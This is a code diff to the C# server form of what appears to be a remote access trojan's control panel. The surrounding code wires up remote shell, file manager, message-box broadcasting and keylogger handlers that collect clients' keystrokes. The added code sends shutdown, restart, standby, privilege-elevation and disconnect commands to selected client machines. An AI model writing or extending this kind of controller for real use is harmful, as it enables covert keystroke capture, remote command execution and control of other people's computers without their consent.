@@ -1,19 +1,20 @@
 ﻿using System;
+using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Collections.Concurrent;
-using System.Net;
-using Server.Networking;
-using Server.Services;
-using Server.Handlers;
+using Common.Enums;
 using Common.Networking;
 using Common.Utils;
+using Server.Handlers;
+using Server.Networking;
+using Server.Services;
 
 namespace Server.Forms
 {
@@ -26,6 +27,7 @@ namespace Server.Forms
         private readonly RemoteShellHandler _remoteShellHandler = new RemoteShellHandler();
         private readonly FileManagerHandler _fileManagerHandler = new FileManagerHandler();
         private readonly MessageBoxHandler _messageBoxHandler = new MessageBoxHandler();
+        private readonly ShutdownActionHandler _shutdownActionHandler = new ShutdownActionHandler();
         private readonly Dictionary<string, KeyLoggerForm> _keyLoggerForms = new Dictionary<string, KeyLoggerForm>();
         private readonly Dictionary<string, Server.Handlers.KeyLoggerHandler> _keyLoggerHandlers = new Dictionary<string, Server.Handlers.KeyLoggerHandler>();
         private readonly CommandService _commandService = new CommandService();
@@ -34,7 +36,7 @@ namespace Server.Forms
         public MainServerForm()
         {
             InitializeComponent();
-            _packetHandler = new PacketHandler(OnSystemInfoResponse, OnRemoteShellResponse, OnFileManagerResponse, OnMessageBoxResponse,
+            _packetHandler = new PacketHandler(OnSystemInfoResponse, OnRemoteShellResponse, OnFileManagerResponse, OnMessageBoxResponse, OnShutdownActionResponse,
                 onKeyLoggerEvent: OnKeyLoggerEvent,
                 onKeyLoggerBatch: OnKeyLoggerBatch,
                 onKeyLoggerComboEvent: OnKeyLoggerComboEvent);
@@ -87,6 +89,14 @@ namespace Server.Forms
                 _messageBoxHandler.SaveLastResponses(response.ClientId, response);
             }
             AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] MessageBoxResponse from {response.ClientId}");
+        }
+        private void OnShutdownActionResponse(ShutdownActionResponse response)
+        {
+            if (!string.IsNullOrEmpty(response.ClientId))
+            {
+                _shutdownActionHandler.SaveLastResponses(response.ClientId, response);
+            }
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] ActionResponse from {response.ClientId}");
         }
         private void OnFileManagerResponse(FileManagerResponse response)
         {
@@ -215,6 +225,89 @@ namespace Server.Forms
                 var messageBoxForm = new MessageBoxForm(_messageBoxHandler);
                 messageBoxForm.Show(this); // set Owner = MainServerForm
                 AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Broadcast Message Box for {selectedClients.Count} clients");
+            }
+        }
+        private void ShutdownToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+
+            var request = new ShutdownActionRequest
+            {
+                RequestId = Guid.NewGuid().ToString(),
+                Action = ShutdownAction.Shutdown
+            };
+
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Shutdown request to {conn.Id}");
+            var json = JsonHelper.Serialize(request);
+            _ = conn.SendAsync(json);
+        }
+
+        private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+
+            var request = new ShutdownActionRequest
+            {
+                RequestId = Guid.NewGuid().ToString(),
+                Action = ShutdownAction.Restart
+            };
+
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Restart request to {conn.Id}");
+            var json = JsonHelper.Serialize(request);
+            _ = conn.SendAsync(json); 
+        }
+
+        private void StandbyToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+
+            var request = new ShutdownActionRequest
+            {
+                RequestId = Guid.NewGuid().ToString(),
+                Action = ShutdownAction.Standby
+            };
+
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Standby request to {conn.Id}");
+            var json = JsonHelper.Serialize(request);
+            _ = conn.SendAsync(json);
+        }
+        private async void ElevateToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+
+            var request = new ShutdownActionRequest
+            {
+                RequestId = Guid.NewGuid().ToString(),
+                Action = ShutdownAction.Elevate,
+            };
+
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Elevate request to {conn.Id}");
+            var json = JsonHelper.Serialize(request);
+            await conn.SendAsync(json);
+        }
+
+        private async void DisconnectToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var conn = GetSelectedConnection();
+            if (conn == null) return;
+
+            var request = new ShutdownActionRequest
+            {
+                RequestId = Guid.NewGuid().ToString(),
+                Action = ShutdownAction.Disconnect
+            };
+
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] Disconnect request to {conn.Id}");
+            var json = JsonHelper.Serialize(request);
+            await conn.SendAsync(json);
+            if (_clients.TryRemove(conn.Id, out _))
+            {
+                conn.Disconnect();
+                RefreshClientsGrid();
             }
         }
 
@@ -416,6 +509,7 @@ namespace Server.Forms
                 dgvClients.BeginInvoke(new Action(RefreshClientsGrid));
                 return;
             }
+
             var rows = new List<ClientRow>();
             foreach (var kv in _clients)
             {
